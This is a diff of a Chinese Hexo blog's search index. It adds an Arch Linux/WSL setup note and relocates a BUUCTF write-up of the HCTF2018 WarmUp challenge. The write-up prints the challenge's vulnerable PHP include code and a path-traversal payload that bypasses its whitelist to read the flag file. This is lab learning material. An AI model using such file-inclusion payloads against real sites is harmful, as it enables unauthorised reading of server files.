@@ -1,6 +1,42 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HCTF2018 WarmUp1代码审计:include分割符</title>
+    <url>/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/</url>
+    <content><![CDATA[<h3 id="HCTF2018-Warmup1-代码审计"><a href="#HCTF2018-Warmup1-代码审计" class="headerlink" title="HCTF2018 Warmup1 代码审计"></a>HCTF2018 Warmup1 代码审计</h3><h4 id="第一步-查看源码"><a href="#第一步-查看源码" class="headerlink" title="第一步:查看源码"></a>第一步:查看源码</h4>
+
+<p>一张大脸,先检查源码：发现:</p>
+<img src="/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/image-20250114210616445.png" class="" title="image-20250114210616445">
+<p>直接访问这个文件,发现一堆代码,需要代码审计:</p>
+<h4 id="第二步-开始审计"><a href="#第二步-开始审计" class="headerlink" title="第二步,开始审计"></a>第二步,开始审计</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这道题总结出来的经验:<br>先不管前面的类,直接看后面的怎么包含file。<br><strong>因为我们的逻辑很清楚:</strong><br>要想得到下一步的线索,就必须利用输入的payloads得到更多的回显,而要得到回显,就是要成功通过前面checkFile()的检查,使得我们传入的被$_REQUEST参数能够被include包含,从而取得回显。<br><strong>在类后面要被include的条件是:</strong><br>file的内容是非空的,<br>file要是字符串<br>在emm类里面继承过来的file文件需要经过处理之后返回为true<br>关键是checkFile要为true。那我们就来看checkFile里面怎么让file检查为true.</p>
+<h5 id="第一步-参数传入-以获得线索"><a href="#第一步-参数传入-以获得线索" class="headerlink" title="第一步,参数传入,以获得线索"></a>第一步,参数传入,以获得线索</h5><p>这里我们就先看了前几个代码块,先看看要满足他们的条件,我们需要传入怎样的参数。<br>这也算是做题的经验了,因为我们不可能一步到位直接得到flag所在文件的名称，先要对前面的函数进行试探输入payloads得到线索。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>($page在这里指的是checkFile()这个函数里面的参数)<br>首先定义了一个数组,其中有source.php和hint.php，如果没有检查到page或者page不为字符串,那么就会返回为false:<br>有返回,那这个checkFile函数也就不会再继续下去了,并且也会返回false,导致我们的$file参数无法被include读取。<br><strong>这里有个重要的知识点:</strong><br>即if括号内部的布尔值对程序整体运行的影响,以及return对整体程序的影响,具体见我分类分在php类别里的博客。<br>由于hint.php在白名单中,完全符合整个checkFile()返回true的条件。<br>那我们先试一下hint.php,显示:</p>
+<img src="/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/image-20250114213943745.png" class="" title="image-20250114213943745">
+<h5 id="第二步-思考如何利用后续代码块特性绕过。"><a href="#第二步-思考如何利用后续代码块特性绕过。" class="headerlink" title="第二步,思考如何利用后续代码块特性绕过。"></a>第二步,思考如何利用后续代码块特性绕过。</h5><p>这里我们肯定不方便直接抓取这个文件，(这里的直接抓取就是指直接把ffffllllaaaagggg引入REQUEST里面的file参数内,因为这样肯定会被checkFile过滤掉并且返回false,无法被include读取)<br>并且根据这道题后面的条件来看,我们要读取这个文件就要使用上include函数,所以我们要继续往后看,看还需要绕过哪些条件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="variable">$_page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解读代码:<br>这里进行了一个代码的截取,操作,是我们绕过checkFile()函数的关键<br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
+<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?</p>
+<h5 id="第三步-配置payloads-开始绕过"><a href="#第三步-配置payloads-开始绕过" class="headerlink" title="第三步,配置payloads,开始绕过"></a>第三步,配置payloads,开始绕过</h5><p>所以利用这里$_page截取?前面的字符,并只将这部分截取的字符给函数检查的特性,我们可以在payloads的?前写为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?</span><br></pre></td></tr></table></figure>
+<p>这样$_page就会只截取到hint.php,并且它确实在白名单内,我们得以成功绕过<br><strong>重点又来了:</strong><br>include有个特性:<br>在它读取的文件部分,我们可以用“&#x2F;”符号把文件分成几个部分:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(example1.php\/example2.php)</span><br></pre></td></tr></table></figure>
+<p>include会挨个读取文件,即使第一个文件不存在,它的读取也不会就此停止<br><strong>所以</strong>:我们可以在hint.php?后面先用”&#x2F;“符号进行分&#x3D;分割,再输入我们想读取的文件,flag<br>这里太坑爹了,flag长成:ffffllllaaaagggg,这居然是在暗示我们,flag在上数四级文件夹的目录下,难绷。<br>所以最终的payloads为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>?前面是为了绕过checkFile()的检查,后面则是我们的文件目标<br>而include在读取的时候因为前面hint.php?没法读取,就会读取”&#x2F;“后的文件,从而顺利得到flag。<br>大功告成,若有不足,希望dalao指出(</p>
+]]></content>
+      <categories>
+        <category>buuctf</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>初见文件上传:[极客大挑战 2019]Upload</title>
     <url>/2025/01/19/2019-Upload/</url>
     <content><![CDATA[<h3 id="初见文件上传-极客大挑战-2019-Upload"><a href="#初见文件上传-极客大挑战-2019-Upload" class="headerlink" title="初见文件上传:[极客大挑战 2019] Upload"></a>初见文件上传:[极客大挑战 2019] Upload</h3><h4 id="进入靶机"><a href="#进入靶机" class="headerlink" title="进入靶机"></a>进入靶机</h4><img src="/2025/01/19/2019-Upload/image-20250119233053920.png" class="" title="image-20250119233053920">
@@ -58,46 +94,43 @@
       </tags>
   </entry>
   <entry>
-    <title>HCTF2018 WarmUp1代码审计:include分割符</title>
-    <url>/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/</url>
-    <content><![CDATA[<h3 id="HCTF2018-Warmup1-代码审计"><a href="#HCTF2018-Warmup1-代码审计" class="headerlink" title="HCTF2018 Warmup1 代码审计"></a>HCTF2018 Warmup1 代码审计</h3><h4 id="第一步-查看源码"><a href="#第一步-查看源码" class="headerlink" title="第一步:查看源码"></a>第一步:查看源码</h4>
-
-<p>一张大脸,先检查源码：发现:</p>
-<img src="/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/image-20250114210616445.png" class="" title="image-20250114210616445">
-<p>直接访问这个文件,发现一堆代码,需要代码审计:</p>
-<h4 id="第二步-开始审计"><a href="#第二步-开始审计" class="headerlink" title="第二步,开始审计"></a>第二步,开始审计</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这道题总结出来的经验:<br>先不管前面的类,直接看后面的怎么包含file。<br><strong>因为我们的逻辑很清楚:</strong><br>要想得到下一步的线索,就必须利用输入的payloads得到更多的回显,而要得到回显,就是要成功通过前面checkFile()的检查,使得我们传入的被$_REQUEST参数能够被include包含,从而取得回显。<br><strong>在类后面要被include的条件是:</strong><br>file的内容是非空的,<br>file要是字符串<br>在emm类里面继承过来的file文件需要经过处理之后返回为true<br>关键是checkFile要为true。那我们就来看checkFile里面怎么让file检查为true.</p>
-<h5 id="第一步-参数传入-以获得线索"><a href="#第一步-参数传入-以获得线索" class="headerlink" title="第一步,参数传入,以获得线索"></a>第一步,参数传入,以获得线索</h5><p>这里我们就先看了前几个代码块,先看看要满足他们的条件,我们需要传入怎样的参数。<br>这也算是做题的经验了,因为我们不可能一步到位直接得到flag所在文件的名称，先要对前面的函数进行试探输入payloads得到线索。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
-<p>($page在这里指的是checkFile()这个函数里面的参数)<br>首先定义了一个数组,其中有source.php和hint.php，如果没有检查到page或者page不为字符串,那么就会返回为false:<br>有返回,那这个checkFile函数也就不会再继续下去了,并且也会返回false,导致我们的$file参数无法被include读取。<br><strong>这里有个重要的知识点:</strong><br>即if括号内部的布尔值对程序整体运行的影响,以及return对整体程序的影响,具体见我分类分在php类别里的博客。<br>由于hint.php在白名单中,完全符合整个checkFile()返回true的条件。<br>那我们先试一下hint.php,显示:</p>
-<img src="/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/image-20250114213943745.png" class="" title="image-20250114213943745">
-<h5 id="第二步-思考如何利用后续代码块特性绕过。"><a href="#第二步-思考如何利用后续代码块特性绕过。" class="headerlink" title="第二步,思考如何利用后续代码块特性绕过。"></a>第二步,思考如何利用后续代码块特性绕过。</h5><p>这里我们肯定不方便直接抓取这个文件，(这里的直接抓取就是指直接把ffffllllaaaagggg引入REQUEST里面的file参数内,因为这样肯定会被checkFile过滤掉并且返回false,无法被include读取)<br>并且根据这道题后面的条件来看,我们要读取这个文件就要使用上include函数,所以我们要继续往后看,看还需要绕过哪些条件。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="variable">$_page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解读代码:<br>这里进行了一个代码的截取,操作,是我们绕过checkFile()函数的关键<br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
-<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?</p>
-<h5 id="第三步-配置payloads-开始绕过"><a href="#第三步-配置payloads-开始绕过" class="headerlink" title="第三步,配置payloads,开始绕过"></a>第三步,配置payloads,开始绕过</h5><p>所以利用这里$_page截取?前面的字符,并只将这部分截取的字符给函数检查的特性,我们可以在payloads的?前写为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?</span><br></pre></td></tr></table></figure>
-<p>这样$_page就会只截取到hint.php,并且它确实在白名单内,我们得以成功绕过<br><strong>重点又来了:</strong><br>include有个特性:<br>在它读取的文件部分,我们可以用“&#x2F;”符号把文件分成几个部分:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(example1.php\/example2.php)</span><br></pre></td></tr></table></figure>
-<p>include会挨个读取文件,即使第一个文件不存在,它的读取也不会就此停止<br><strong>所以</strong>:我们可以在hint.php?后面先用”&#x2F;“符号进行分&#x3D;分割,再输入我们想读取的文件,flag<br>这里太坑爹了,flag长成:ffffllllaaaagggg,这居然是在暗示我们,flag在上数四级文件夹的目录下,难绷。<br>所以最终的payloads为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p>?前面是为了绕过checkFile()的检查,后面则是我们的文件目标<br>而include在读取的时候因为前面hint.php?没法读取,就会读取”&#x2F;“后的文件,从而顺利得到flag。<br>大功告成,若有不足,希望dalao指出(</p>
-]]></content>
-      <categories>
-        <category>buuctf</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>我的第一篇博客</title>
     <url>/2025/01/11/25.1.9/</url>
     <content><![CDATA[<h3 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h3><p>第一次写博客,这是一个测试</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>Arch_linux入门</title>
+    <url>/2025/01/19/Arch-linux%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h3 id="Arch-Linux入门"><a href="#Arch-Linux入门" class="headerlink" title="Arch_Linux入门"></a>Arch_Linux入门</h3><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><h5 id="bash-profile"><a href="#bash-profile" class="headerlink" title=".bash_profile"></a>.bash_profile</h5><p>1.隐藏文件,有”.”前缀,它是一个 Shell 脚本文件，在用户登录时会被执行，通常用于设置用户的环境变量、别名等个性化配置。<br>2.具体指令:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br></pre></td></tr></table></figure>
+<p>vim~&#x2F;,该命令是说用vim打开.bash_profile，进行环境变量设置。</p>
+<h5 id="export-EDITOR-’vim’"><a href="#export-EDITOR-’vim’" class="headerlink" title="export EDITOR&#x3D;’vim’"></a>export EDITOR&#x3D;’vim’</h5><p>具体解释:<br>1.export：这是一个 Shell 命令，用于将指定的变量导出为环境变量。环境变量可以在当前 Shell 会话及其子进程中被访问和使用。<br>2.EDITOR：这是一个环境变量名，许多程序和脚本会读取这个环境变量的值，来确定默认使用哪个文本编辑器。例如，一些版本控制系统（如 Git）在需要用户编辑提交信息等文本内容时，就会调用EDITOR环境变量指定的编辑器。<br>&#x3D;’vim’：这部分是给EDITOR环境变量赋值，将其值设置为vim，表示把vim文本编辑器设为默认的文本编辑器。<br>3.总的来说，export EDITOR&#x3D;’vim’这条命令的作用是设置系统的默认文本编辑器为vim 。</p>
+<h5 id="准备非root用户"><a href="#准备非root用户" class="headerlink" title="准备非root用户"></a>准备非root用户</h5><p><strong>useradd命令概述</strong><br>useradd是一个用于在 Linux 系统中创建新用户的命令。它有多个选项来定义新用户的各种属性，如主目录、所属组、默认 Shell 等。<br>各个选项的含义<br><strong>-m选项：</strong><br>含义：这个选项用于创建用户的主目录。如果不使用-m选项，系统可能不会自动为新用户创建主目录。主目录是用户存储个人文件、配置文件等的地方，通常位于&#x2F;home目录下，新用户的主目录名称会与用户名相同，比如为myusername用户创建的主目录可能是&#x2F;home&#x2F;myusername。<br><strong>-G wheel选项：</strong><br>含义：-G用于指定用户所属的附加组（groups）。在这里，wheel是一个组名。在许多 Linux 发行版中，wheel组具有特殊的权限，例如可以通过sudo命令来执行需要管理员权限的任务。将用户添加到wheel组意味着这个新用户（myusername）可能会被赋予一些额外的管理权限相关的功能。不过，具体的权限还需要根据系统的sudo配置等来确定。<br><strong>-s &#x2F;bin&#x2F;bash选项：</strong><br>含义：-s用于指定用户的默认 Shell。Shell 是用户与系统进行交互的接口，在这里将用户myusername的默认 Shell 设置为&#x2F;bin&#x2F;bash。&#x2F;bin&#x2F;bash是一个非常常用的 Shell，它提供了命令补全、历史记录等许多方便的功能，让用户可以更高效地在终端中输入命令和操作系统。<br><strong>myusername参数：</strong><br>含义：这是要创建的新用户的用户名。它是useradd命令的最后一个参数，用于指定新用户的名称，在系统中用于唯一标识这个用户，并且在后续涉及用户相关的操作（如登录、文件权限设置等）中都会用到这个用户名。</p>
+<h5 id="visudo"><a href="#visudo" class="headerlink" title="visudo"></a>visudo</h5><p>visudo是一个用于安全编辑sudoers文件的命令。sudoers文件包含了用户权限配置信息，规定了哪些用户可以以超级用户（root）权限执行哪些命令。使用visudo命令而不是直接编辑sudoers文件（如vim &#x2F;etc&#x2F;sudoers），是因为visudo在编辑前会对文件进行语法检查，防止因错误编辑导致sudo功能无法正常使用或产生安全漏洞。</p>
+<h4 id="初始化系统"><a href="#初始化系统" class="headerlink" title="初始化系统"></a>初始化系统</h4><p>这里是我在arch 中装桌面遇到的情况<br>相关命令:</p>
+<h5 id="添加systemd方式"><a href="#添加systemd方式" class="headerlink" title="添加systemd方式"></a>添加systemd方式</h5><p>配置 WSL 使用 systemd：<br>打开或创建 &#x2F;etc&#x2F;wsl.conf 文件（如果没有这个文件，手动创建）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nvim /etc/wsl.conf</span><br></pre></td></tr></table></figure>
+<p>添加如下内容启用systemd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[boot]</span><br><span class="line">systemd=true</span><br></pre></td></tr></table></figure>
+<p>为了使更改生效,在powershell中重启wsl:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
+<p>验证 systemd 是否工作:<br>重启 WSL 后，检查 systemd 是否正常运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -p 1</span><br></pre></td></tr></table></figure>
+<p>如果一切正常，你应该看到 systemd 作为进程 1 运行。</p>
+<h4 id="有关wsl2的设置"><a href="#有关wsl2的设置" class="headerlink" title="有关wsl2的设置"></a>有关wsl2的设置</h4><h5 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a>前置工作</h5><p>首先你需要下载软件支持:<br><a href="https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package">https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package</a></p>
+<h5 id="重要指令"><a href="#重要指令" class="headerlink" title="重要指令:"></a>重要指令:</h5><p>1.检查wsl中Linux操作系统的wsl版本:<br>powershell中执行:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure>
+<p>2.设定版本:<br>将默认版本设定为2:<br>powershell中执行</p>
